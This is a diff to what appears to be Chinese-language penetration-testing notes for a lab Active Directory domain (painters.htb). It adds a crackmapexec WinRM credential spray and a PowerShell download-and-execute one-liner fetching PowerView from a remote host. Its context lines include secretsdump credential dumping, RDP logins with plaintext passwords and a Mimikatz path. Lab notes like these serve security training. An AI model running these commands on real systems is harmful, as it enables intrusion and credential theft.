@@ -1,3 +1,7 @@
+#  crackmapexec
+
+`crackmapexec winrm 192.168.110.0/24 -u 'PAINTERS.HTB\backdoor_user' -p 'P@ssw0rd123!'`
+
 # RDP
 
 #### 1. 启用 RDP 服务
@@ -29,4 +33,9 @@ xfreerdp /u:riley /p:P@ssw0rd /d:painters.htb /v:192.168.110.56 /cert:ignore
 secretsdump.py painters.htb/web_svc:'!QAZ1qaz'@192.168.110.52
 
 `/usr/share/windows-resources/powersploit/Exfiltration/Invoke-Mimikatz.ps1`
+
+# PowerShell remote script
+
+`iex (iwr http://10.10.14.3/PowerView.ps1 -UseBasicParsing)`
+
 
